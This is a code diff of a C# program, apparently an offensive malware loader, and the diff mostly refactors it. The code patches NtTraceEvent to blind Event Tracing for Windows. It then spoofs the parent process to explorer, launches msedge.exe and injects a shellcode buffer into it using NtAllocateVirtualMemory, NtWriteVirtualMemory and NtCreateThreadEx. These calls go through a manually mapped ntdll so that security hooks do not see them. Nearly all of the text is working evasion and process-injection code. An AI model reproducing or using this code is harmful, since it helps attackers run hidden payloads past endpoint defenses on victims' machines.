@@ -75,20 +75,29 @@ namespace ManualMap
         public delegate bool CloseHandleDelegate(IntPtr hObject);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+        public static extern bool InitializeProcThreadAttributeList(
+            IntPtr lpAttributeList, 
+            int dwAttributeCount, 
+            int dwFlags, 
+            ref IntPtr lpSize);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+        public static extern bool UpdateProcThreadAttribute(
+            IntPtr lpAttributeList, 
+            uint dwFlags, 
+            IntPtr Attribute, 
+            IntPtr lpValue, 
+            IntPtr cbSize, 
+            IntPtr lpPreviousValue, 
+            IntPtr lpReturnSize);
 
-        
-        public static bool p3TW()
+
+        public static bool p3TW(Data.PE.PE_MANUAL_MAP nt)
         {
-            var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
-
             IntPtr addr = Generic.GetLibraryAddress("ntdll.dll", "NtTraceEvent");
             byte[] patch = new byte[] { 0xc3 };
 
-            object[] paramNPVM =
+            var funcParams = new object[]
             {
                 (IntPtr)(-1),
                 addr,
@@ -102,7 +111,7 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtProtectVirtualMemory",
                 typeof(NtProtectVirtualMemoryDelegate),
-                paramNPVM,
+                funcParams,
                 false);
 
             if (res != Data.Native.NTSTATUS.Success)
@@ -113,12 +122,12 @@ namespace ManualMap
 
             Marshal.Copy(patch, 0, addr, 1);
 
-            object[] paramNPVM2 =
+            funcParams = new object[]
             {
                 (IntPtr)(-1),
                 addr,
                 (IntPtr)patch.Length,
-                (uint)paramNPVM[4],
+                (uint)funcParams[4],
                 new uint()
             };
 
@@ -127,34 +136,32 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtProtectVirtualMemory",
                 typeof(NtProtectVirtualMemoryDelegate),
-                paramNPVM2,
+                funcParams,
                 false);
 
             if (res != Data.Native.NTSTATUS.Success)
             {
-                Map.FreeModule(nt);
                 return false;
             }
-
-            Map.FreeModule(nt);
             return true;
         }
 
-        public static void Main(string[] args)
+        public static void Main()
         {
+            // map dll
+            var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
+            var krn = Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
+            Console.WriteLine("[>] NTDLL mapped to 0x{0:X}", nt.ModuleBase.ToInt64());
+            Console.WriteLine("[>] Kernel32 mapped to 0x{0:X}", krn.ModuleBase.ToInt64());
+
             // patch etw
-            if (!p3TW())
+            if (!p3TW(nt))
             {
                 Console.Error.WriteLine($"[x] Event Tracing for Windows Error: {Marshal.GetLastWin32Error()}");
                 return;
             }
             Console.WriteLine("[>] Event Tracing for Windows Patched");
 
-            // map dll
-            var nt = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
-            var krn = Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
-            Console.WriteLine("[>] NTDLL mapped to 0x{0:X}", nt.ModuleBase.ToInt64());
-            Console.WriteLine("[>] Kernel32 mapped to 0x{0:X}", krn.ModuleBase.ToInt64());
 
             // ppid dpoof & blockdlls
             var startInfoEx = new STARTUPINFOEX();
@@ -186,7 +193,7 @@ namespace ManualMap
                 IntPtr.Zero
                 );
 
-            var parentHandle = Process.GetProcessesByName("msedge")[0].Handle;
+            var parentHandle = Process.GetProcessesByName("explorer")[0].Handle;
             lpValue = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(lpValue, parentHandle);
 
@@ -201,10 +208,10 @@ namespace ManualMap
                 );
 
             // create process
-            object[] paramCPW =
+            var funcParams = new object[]
                 {
                     @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-                    @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
+                    @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start""",
                     processSecurity,
                     threadSecurity,
                     false,
@@ -220,12 +227,11 @@ namespace ManualMap
                 krn.ModuleBase,
                 "CreateProcessW",
                 typeof(CreateProcessWDelegate),
-                paramCPW,
+                funcParams,
                 false);
 
-            var pi = (PROCESS_INFORMATION)paramCPW[9];
+            var pi = (PROCESS_INFORMATION)funcParams[9];
 
-            // bail if it failed
             if (!success)
             {
                 Console.WriteLine("[x] CreateProcessW failed with error code: {0}", Marshal.GetLastWin32Error());
@@ -250,7 +256,7 @@ namespace ManualMap
             };
 
             // NtAllocateVirtualMemory
-            object[] paramNAVM =
+            funcParams = new object[]
             {
                 pi.hProcess,
                 IntPtr.Zero,
@@ -265,10 +271,10 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtAllocateVirtualMemory",
                 typeof(NtAllocateVirtualMemoryDelegate),
-                paramNAVM,
+                funcParams,
                 false);
 
-            var baseAddress = (IntPtr)paramNAVM[1];
+            var baseAddress = (IntPtr)funcParams[1];
 
             if (res != Data.Native.NTSTATUS.Success)
             {
@@ -281,7 +287,8 @@ namespace ManualMap
             var buffer = Marshal.AllocHGlobal(sh.Length);
             Marshal.Copy(sh, 0, buffer, sh.Length);
             uint bytesWritten = 0;
-            object[] paramNWVM =
+            
+            funcParams = new object[]
             {
                 pi.hProcess,
                 baseAddress,
@@ -295,7 +302,7 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtWriteVirtualMemory",
                 typeof(NtWriteVirtualMemoryDelegate),
-                paramNWVM,
+                funcParams,
                 false);
 
             if (res != Data.Native.NTSTATUS.Success)
@@ -308,7 +315,8 @@ namespace ManualMap
 
             // NtProtectVirtualMemory
             uint oldP = 0;
-            object[] paramNPVM =
+            
+            funcParams = new object[]
             {
                 pi.hProcess,
                 baseAddress,
@@ -322,7 +330,7 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtProtectVirtualMemory",
                 typeof(NtProtectVirtualMemoryDelegate),
-                paramNPVM,
+                funcParams,
                 false);
 
             if (res != Data.Native.NTSTATUS.Success)
@@ -332,9 +340,9 @@ namespace ManualMap
             }
             Console.WriteLine("[>] NtProtectVirtualMemory OK");
 
-
+            // NtCreateThreadEx
             IntPtr hThread = IntPtr.Zero;
-            object[] paramNCTE =
+            funcParams = new object[]
             {
                 hThread,
                 ACCESS_MASK.MAXIMUM_ALLOWED,
@@ -354,7 +362,7 @@ namespace ManualMap
                 nt.ModuleBase,
                 "NtCreateThreadEx",
                 typeof(NtCreateThreadExDelegate),
-                paramNCTE,
+                funcParams,
                 false);
 
             if (res != Data.Native.NTSTATUS.Success)
@@ -370,19 +378,19 @@ namespace ManualMap
             Map.FreeModule(nt);
 
             // close handles
-            object[] param1 = { pi.hThread };
-            success = (bool)Generic.DynamicApiInvoke<bool>(
+            funcParams = new object[] { pi.hThread };
+            success = Generic.DynamicApiInvoke<bool>(
                 "kernel32.dll",
                 "CloseHandle",
                 typeof(CloseHandleDelegate),
-                ref param1);
+                ref funcParams);
 
-            object[] param2 = { pi.hProcess };
-            success = (bool)Generic.DynamicApiInvoke<bool>(
+            funcParams = new object[] { pi.hProcess };
+            success = Generic.DynamicApiInvoke<bool>(
                 "kernel32.dll",
                 "CloseHandle",
                 typeof(CloseHandleDelegate),
-                ref param2);
+                ref funcParams);
         }
     }
 }
